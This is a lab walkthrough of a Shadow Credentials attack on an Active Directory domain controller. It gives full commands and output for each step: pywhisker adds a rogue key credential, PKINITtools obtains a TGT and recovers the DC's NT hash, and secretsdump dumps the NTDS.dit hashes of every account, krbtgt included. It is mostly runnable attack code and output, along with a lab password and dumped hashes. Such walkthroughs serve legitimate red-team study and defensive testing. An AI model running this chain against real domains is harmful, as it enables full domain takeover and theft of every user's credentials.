# Shadow Credentials

## tips
1. use python3.8
2. use the `-dc-ip` flag to point to the domain controller

## Scenario
domain: lab.local
ADCS: present and required for PKINIT
user: sysadmin
group membership: key admins
privilege: AddKeyCredentialLink over Domain Controller: DC$

## Step #1: List key credentials
listing the keys on the DC. the out gives an either/or answer so we should try going for it

### Command
```bash
python3.8 pywhisker.py -v --dc-ip dc -d lab.local -u sysadmin -p 'Abc123!!' --target 'dc$' --action list
```
### Output
```
[*] Searching for the target account
[*] Target user found: CN=DC,OU=Domain Controllers,DC=LAB,DC=local
[*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute
```

## Action #2: Add key credentials

### Command
```bash
python3.8 pywhisker.py -v --dc-ip dc -d lab.local -u sysadmin -p 'Abc123!!' --target 'dc$' --action add
```
### Output
```
[*] Searching for the target account
[*] Target user found: CN=DC,OU=Domain Controllers,DC=LAB,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: e3550b17-9746-d819-99eb-0d907c12922d
[*] Updating the msDS-KeyCredentialLink attribute of dc$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[VERBOSE] No filename was provided. The certificate(s) will be stored with the filename: dnUC8Y14
[VERBOSE] No pass was provided. The certificate will be stored with the password: cCw1PLYcsQsUJggLshDq
[+] Saved PFX (#PKCS12) certificate & key at path: dnUC8Y14.pfx
[*] Must be used with password: cCw1PLYcsQsUJggLshDq
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
[VERBOSE] Run the following command to obtain a TGT
[VERBOSE] python3 PKINITtools/gettgtpkinit.py -cert-pfx dnUC8Y14.pfx -pfx-pass cCw1PLYcsQsUJggLshDq lab.local/dc$ dnUC8Y14.ccache
```

## Step #3: Getting TGT
using PKINIT, we request a TGT

### Command
```bash
python3.8 /opt/PKINITtools/gettgtpkinit.py -v -dc-ip dc -cert-pfx dnUC8Y14.pfx -pfx-pass cCw1PLYcsQsUJggLshDq lab.local/dc$ dnUC8Y14.ccache
```

### Output
```
2022-07-05 05:58:06,827 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-07-05 05:58:06,841 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-07-05 05:58:18,909 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-07-05 05:58:18,909 minikerberos INFO     5f35c60f52a4aa68fedf4673b70b6b9f08ca8a494031fbb361b2302954c1969f
INFO:minikerberos:5f35c60f52a4aa68fedf4673b70b6b9f08ca8a494031fbb361b2302954c1969f
2022-07-05 05:58:18,912 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

## Step #4: Getting NTHASH
using the key generated in Step #3 and exporting the generated TGT into our kerberos cache, we're going to get the NTLM hash for the DC :D

### Command
```bash
export KRB5CCNAME=/opt/pywhisker/dnUC8Y14.ccache
python3.8 /opt/PKINITtools/getnthash.py -dc-ip dc lab.local/'DC$' -key 5f35c60f52a4aa68fedf4673b70b6b9f08ca8a494031fbb361b2302954c1969f
```

### Output
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
8028aac845cdc82881b55e1d0b1c88e5
```

## Step #5: Dumping NTDS.dit
hashes. hashes everwhere

### Command:
```bash
secretsdump.py -just-dc-ntlm -dc-ip dc lab.local/'DC$'@dc.lab.local -hashes :8028aac845cdc82881b55e1d0b1c88e5
```

### Output:
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:eff164ce8ed0ac98cb7520c4de7dfc0b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
LAB.local\FSAdmin:1104:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
LAB.local\Regular:1106:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
LAB.local\SysAdmin:1107:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
LAB.local\JohnSmith:1108:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
LAB.local\NewUser:1113:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
DcpnYhFXlO:1117:aad3b435b51404eeaad3b435b51404ee:565cae8a079a5078163bc7969d132b9b:::
PoCOUBzGGU:1118:aad3b435b51404eeaad3b435b51404ee:1713981fe06cd340348300f7500befcf:::
john:1123:aad3b435b51404eeaad3b435b51404ee:98da674948a73eb2cfa124e9aca27a03:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:8028aac845cdc82881b55e1d0b1c88e5:::
CLIENT1$:1105:aad3b435b51404eeaad3b435b51404ee:43ca831bd985a0e64297f7799b39660b:::
FS$:1115:aad3b435b51404eeaad3b435b51404ee:995c9d47bb2bf0ff113b525d38cae2e1:::
HZBDQHVP$:1116:aad3b435b51404eeaad3b435b51404ee:38ae9e7ea8d9ab0f07982baac9e11b48:::
SFDRQNQH$:1119:aad3b435b51404eeaad3b435b51404ee:094a2d83f66f017ccd989a024e7bceee:::
JWHMHWBU$:1120:aad3b435b51404eeaad3b435b51404ee:53fb78699467a971ee2a51109afcf7e2:::
gmsa1$:1122:aad3b435b51404eeaad3b435b51404ee:2be99b0ca6594829276aaf74358624b8:::
[*] Cleaning up... 
```

## (Optional) Step #6: Removing the msDS-KeyCredentialLink
you will need the device GUID for this stem --> it's provided in the output of the command in step #1

### Command
```bash
python3.8 pywhisker.py --dc-ip dc -d 'lab.local' -u 'sysadmin' -p 'Abc123!!' --target 'DC$' --action remove --device-id 'e3550b17-9746-d819-99eb-0d907c12922d'
```

### Output
```
[*] Searching for the target account
[*] Target user found: CN=DC,OU=Domain Controllers,DC=LAB,DC=local
[*] Found value to remove
[*] Updating the msDS-KeyCredentialLink attribute of DC$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
```